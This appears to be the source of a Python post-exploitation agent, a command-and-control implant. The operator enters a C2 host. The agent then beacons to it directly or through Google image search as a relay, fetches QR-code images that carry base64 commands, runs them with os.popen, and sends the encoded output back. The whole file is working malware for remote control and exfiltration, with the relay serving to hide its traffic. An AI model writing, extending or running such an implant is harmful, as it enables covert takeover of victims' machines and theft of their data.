#!/bin/python
import os, base64, time, requests, random, uuid, shutil, qrcode, qrtools, urllib.parse, re
from PIL import Image
from pyzbar.pyzbar import decode

beaconint = random.randint(0, 9)
uuidval = (uuid.uuid1())
agentid = str(uuidval)
#agentid = 'e383694c-f9e0-11ea-a2fa-001a7dda7113'

## Welcome Screen
print('\r\n#########################################\r\nWelcome to the QR Post Exploit Agent! \r\n#########################################\r\n\r\n')

print ('Please enter the domain or IP address of the C2 server. (Public, if not using a Direct Connection)\r\n')

result = ''

host = input('#: ')

print ('\r\nChoose an exfil type below to get started.\r\n')

print ('1.\tDirect Connection (No Proxy/Redirector)')
print ('2.\tGoogle Images')
print ('3.\tImgur')
print ('4.\tImgflip\r\n')

def direct(cmd,result):
    # C2 URL
    URL = 'http://' + host + ':45620/img.png'

    if result is None:
        result = ''
  
    # defining a params dict for the parameters to be sent to the API 
    PARAMS = {'id':agentid,'name':'Agent','result':result} 
  
    # sending get request and saving the response as response object 
    r = requests.get(url = URL, params = PARAMS, stream=True)
    responsesize = len(r.content)
    
    if responsesize != 249856 or 0:
        with open('img.png', 'wb') as out_file:
            for chunk in r.iter_content(chunk_size=1024):
                    out_file.write(chunk)
        del r 
        
        read_qr(cmd)
    
    return
    
def google(cmd,result):
    #print('google')
    URL = 'https://images.google.com/?gws_rd=ssl'
 
    ## Getting Cookie for Image Search
    r = requests.get(url = URL)
    headers = r.headers['Set-Cookie']
    headersarray = headers.split(';')
    exp = headersarray[0]
    session = headersarray[4][9:]
    cookie = exp + '; ' + session
    #print(cookie)
    
    randval = (uuid.uuid1())
    cachebust = str(randval)
    
    ## Prepare Google Image Search to With C2 Payload
    payload_url = urllib.parse.quote('http://' + host + ':45620/img.png?id=' + agentid + '&name=Agent&result=' + result + '&rand=' + cachebust, safe='')
    
    URL = 'https://images.google.com/searchbyimage'
    PARAMS = {'image_url': payload_url,'encoded_image':'','image_content':'','filename':'','hl':'en'}
    HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36','Cookie':cookie,'Upgrade-Insecure-Requests':'1','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'navigate','Sec-Fetch-User':'?1','Sec-Fetch-Dest':'document','Referer':'https://images.google.com/','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9'}

    r = requests.get(url = URL, params = PARAMS, headers = HEADERS)
    
    #print(r.content)
    body = str(r.content)
    
    result = re.search('src="//(.*)=s30', body)
    server_qr = 'https://' + result.group(1)
    
    r = requests.get(url = server_qr, stream=True)
    responsesize = len(r.content)
    
    #print(responsesize)
    
    if responsesize != 30213 or 0:
        with open('img.png', 'wb') as out_file:
            for chunk in r.iter_content(chunk_size=1024):
                    out_file.write(chunk)
        del r 
        
        read_qr(cmd)    
    
    return
    
def imgur(cmd,result):
    print('Imgur support coming soon!')
    return
    
def imgflip(cmd,result):
    print('Imgflip support coming soon!')
    return

def inputfn(cmd,result):
    ## Input for Interacting With the Client
    if cmd == "1":
        direct(cmd,result)
    elif cmd == "2":
        google(cmd,result)
    elif cmd == "3":
        imgur(cmd,result)
    elif cmd == "4":
        imgflip(cmd,result)
    elif cmd == "quit" or "exit" or "bye":
        os._exit(1)
    else:
        print('Not a valid selection. Exiting..')
        os._exit(1)

def os_exec(cmd,command):
    print('Executing Command: ' + command + ' (Output Sent to C2)\r\n')
    stream = os.popen(command)
    output = stream.read()
    #print(output)
    
    string_bytes = output.encode("ascii") 
    base64_bytes = base64.b64encode(string_bytes) 
    b64output = base64_bytes.decode("ascii")
    
    inputfn(cmd,b64output)
    return
    
def read_qr(cmd):
    data = decode(Image.open('img.png'))
    b = data[0][0]
    b64response = b.decode('utf-8')
    
    base64_bytes = b64response.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    command = message_bytes.decode('ascii')
    
    os_exec(cmd,command)
    return

cmd = input("#: ")

print ('\r\nConnecting to C2 and retrieving commands.. (This will run continuously so hit Ctrl-C to interrupt and exit when finished)\r\n')

inputfn(cmd,result)

while 1 == 1:
    inputfn(cmd,result)
    time.sleep(beaconint)